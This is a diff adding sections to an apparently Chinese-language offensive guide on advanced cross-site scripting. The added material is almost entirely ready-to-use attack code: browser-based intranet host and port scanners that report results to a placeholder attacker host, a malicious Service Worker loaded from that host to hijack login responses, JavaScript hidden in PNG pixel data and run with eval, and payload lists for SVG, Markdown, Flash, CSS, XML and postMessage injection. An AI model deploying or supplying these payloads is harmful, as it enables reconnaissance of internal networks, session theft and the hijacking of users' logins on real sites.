@@ -173,3 +173,357 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 ```
 
 payload:
+[screenshot.js](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/screenshot.js)
+
+## 5.扫描主机
+
+(1)扫描主机
+
+```javascript
+<script>
+var q = []
+var collaboratorURL = 'http://攻击者主机/';
+var wait = 2000
+var n_threads = 50
+
+//使用fetchUrl以枚举所有可能主机
+for(i=1;i<=255;i++){
+  q.push(
+  function(url){
+    return function(){
+        fetchUrl(url, wait);
+    }
+  }('http://192.168.8.'+i+':80'));
+}
+
+for(i=1; i<=n_threads; i++){
+  if(q.length) q.shift()();
+}
+
+function fetchUrl(url, wait){
+    console.log(url)
+  var controller = new AbortController(), signal = controller.signal;
+  fetch(url, {signal}).then(r=>r.text().then(text=>
+    {
+        location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
+    }
+  ))
+  .catch(e => {
+  if(!String(e).includes("The user aborted a request") && q.length) {
+    q.shift()();
+  }
+  });
+
+  setTimeout(x=>{
+  controller.abort();
+  if(q.length) {
+    q.shift()();
+  }
+  }, wait);
+}
+</script>
+```
+
+(2)扫描端口号
+
+```javascript
+<script>
+const checkPort = (port) => {
+  fetch(`http://localhost:${port}`, { mode: "no-cors" })
+    .then(() => {
+      let img = document.createElement("img");
+      img.src = `http://攻击者主机/ping?port=${port}`;
+      document.body.appendChild(img);
+    })
+    .catch(e => console.error(`Fetch failed for port ${port}`, e)); };
+for(let i = 1; i <= 1000; i++) {  //扫描1-1000之间的端口号
+  checkPort(i);
+}
+</script>
+```
+
+## 6.Service Worker
+
+payload
+```javascript
+// 注册Service Worker
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.register('http://攻击者主机/service-worker.js')
+    .then(function(registration) {
+      console.log('Service Worker 注册成功，作用域为: ', registration.scope);
+    })
+    .catch(function(error) {
+      console.log('Service Worker 注册失败: ', error);
+    });
+}
+```
+
+service-worker.js:
+```javascript
+self.addEventListener('install', function(event) {
+  console.log('Service Worker 安装成功');
+});
+
+self.addEventListener('fetch', function(event) {
+  console.log('拦截到请求: ', event.request.url);
+  // 检查请求是否为目标网站的登录请求
+  if (event.request.url.endsWith('/login')) {
+    // 创建一个新的响应对象，替换原有响应
+    const newResponse = new Response('这是一个替换的响应', {
+      status: 200,
+      statusText: 'OK',
+      headers: { 'Content-Type': 'text/plain' }
+    });
+    // 使用新的响应对象响应fetch事件
+    event.respondWith(newResponse);
+  }
+});
+```
+
+GitHub tools:
+
+[shadow-worers](https://shadow-workers.github.io/)
+
+## 7.Shadow DOM
+
+payload
+```javascript
+<div id="hostElement"></div>
+<script>
+  var host = document.getElementById('hostElement');
+  //访问宿主元素
+  var shadow = host.attachShadow({ mode: "open" });
+  //附加影子根
+  shadow.innerHTML = '<style>h1 {color: red;}</style><h1>恶意脚本来喽</h1>';
+  //使用innerHTML将非脚本内容添加到影子根
+  var script = document.createElement('script');
+  script.textContent = 'alert(1);';
+  shadow.appendChild(script);
+  //将脚本附加到Shadow DOM
+</script>
+```
+
+## 8.文件中的XSS
+
+(1)png
+
+png.php:
+```php
+<html>
+<body>
+	<img src="<?php echo $_GET["id"]?>MyCookie?">
+</body>
+</html>
+```
+
+控制台生成XSS图片：
+```javascript
+(function() {
+    //将字符串编码为图像的DataURL
+    function encode(a) {
+        if (a.length) {
+            var c = a.length,
+                e = Math.ceil(Math.sqrt(c / 3)),
+                f = e,
+                g = document.createElement("canvas"),
+                h = g.getContext("2d");
+            g.width = e, g.height = f;
+            var j = h.getImageData(0, 0, e, f),
+                k = j.data,
+                l = 0;
+            //遍历字符串，将字符的ASCII值赋给像素点
+            for (var m = 0; m < f; m++)
+                for (var n = 0; n < e; n++) {
+                    var o = 4 * (m * e) + 4 * n,
+                        p = a[l++],
+                        q = a[l++],
+                        r = a[l++];
+				  //如果字符串存在，将其ASCII值赋给对应的像素点
+                    (p || q || r) && (p && (k[o] = ord(p)), q && (k[o + 1] = ord(q)), r && (k[o + 2] = ord(r)), k[o + 3] = 255)
+                }
+		   //将修改后的像素数据放回canvas，并返回DataURL
+            return h.putImageData(j, 0, 0), h.canvas.toDataURL()
+        }
+    }
+    //获取字符的ASCII值
+    var ord = function ord(a) {
+        var c = a + "",
+            e = c.charCodeAt(0);
+	    //处理Unicode代理对
+        if (55296 <= e && 56319 >= e) {
+            if (1 === c.length) return e;
+            var f = c.charCodeAt(1);
+            return 1024 * (e - 55296) + (f - 56320) + 65536
+        }
+        return 56320 <= e && 57343 >= e ? e : e
+    },
+    d = document,
+    b = d.body,
+    img = new Image;
+    //要编码的字符串，包含一个简单的JavaScript函数
+    var stringenc = "function asd() {\
+        var d = document;\
+        var c = 'cookie';\
+        alert(d[c]);\
+    };asd();";  //可填充字符串以更改图像大小
+    //使用encode函数将字符串编码为图像的DataURL，并清空body的内容和添加信图像元素
+    img.src = encode(stringenc), b.innerHTML = "", b.appendChild(img)
+})();
+```
+
+解析图片并执行(需要Base64编码)：
+```javascript
+// 获取页面上id为'jsimg'的元素
+t = document.getElementById("jsimg");
+// 创建一个canvas元素并获取其上下文和样式
+var s = String.fromCharCode, c = document.createElement("canvas");
+var cs = c.style,
+    cx = c.getContext("2d"),
+    w = t.offsetWidth, // 元素的宽度
+    h = t.offsetHeight; // 元素的高度
+// 设置canvas的宽高
+c.width = w;
+c.height = h;
+cs.width = w + "px";
+cs.height = h + "px";
+// 将目标元素绘制到canvas上
+cx.drawImage(t, 0, 0);
+// 获取canvas上的像素数据
+var x = cx.getImageData(0, 0, w, h).data;
+// 初始化一个空字符串用于存储解码的字符串
+var a = "",
+    l = x.length,
+    p = -1;
+// 遍历像素数据，每四个值（RGBA）为一组，提取RGB值
+for (var i = 0; i < l; i += 4) {
+    if (x[i + 0]) a += s(x[i + 0]); // R值
+    if (x[i + 1]) a += s(x[i + 1]); // G值
+    if (x[i + 2]) a += s(x[i + 2]); // B值
+}
+// 执行解码后的字符串作为JavaScript代码
+eval(a);
+```
+
+完整payload：
+```javascript
+http://目标WEB应用程序地址/png.php?id=http://上传图片后的地址/index.png%22+id=%22jsimg%22+onload=%27javascript:eval(atob(%22Base64编码后的有效负载%22))%27%3E%3Ca+href=%22
+```
+
+(2)XML
+
+payload
+```javascript
+<html>
+<head></head>
+<body>
+<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
+</body>
+</html>
+```
+
+(3)SVG
+
+payload
+```javascript
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+  <script type="text/javascript">
+    alert(document.domain);
+  </script>
+</svg>
+```
+
+payload
+```javascript
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
+<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
+```
+
+(4)MarkDown
+
+payload
+```javascript
+[a](javascript:prompt(document.cookie))
+[a](j a v a s c r i p t:prompt(document.cookie))
+[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+[a](javascript:window.onerror=alert;throw%201)
+```
+
+(5)SWF Flash
+
+payload
+```javascript
+IE浏览器
+IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
+IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
+IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);
+
+其它
+flashmediaelement.swf?jsinitfunctio%gn=alert`1`
+flashmediaelement.swf?jsinitfunctio%25gn=alert(1)
+ZeroClipboard.swf?id=\"))} catch(e) {alert(1);}//&width=1000&height=1000
+swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!alert(1);//
+swfupload.swf?buttonText=test<a href="javascript:confirm(1)"><img src="https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg"/></a>&.swf
+plupload.flash.swf?%#target%g=alert&uid%g=XSS&
+moxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=true
+video-js.swf?readyFunction=alert(1)
+player.swf?playerready=alert(document.cookie)
+player.swf?tracecall=alert(document.cookie)
+banner.swf?clickTAG=javascript:alert(1);//
+io.swf?yid=\"));}catch(e){alert(1);}//
+video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29
+bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4
+flashcanvas.swf?id=test\"));}catch(e){alert(document.domain)}//
+phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domain)}//
+```
+
+(6)CSS
+
+payload
+```css
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+div  {
+    background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
+    background-color: #cccccc;
+}
+</style>
+</head>
+  <body>
+    <div>lol</div>
+  </body>
+</html>
+```
+
+(7)PostMessage
+
+payload
+```javascript
+<html>
+<body>
+    <input type=button value="Click Me" id="btn">
+</body>
+
+<script>
+document.getElementById('btn').onclick = function(e){
+    window.poc = window.open('http://www.redacted.com/#login');
+    setTimeout(function(){
+        window.poc.postMessage(
+            {
+                "sender": "accounts",
+                "url": "javascript:confirm('XSS')",
+            },
+            '*'
+        );
+    }, 2000);
+}
+</script>
+</html>
+```
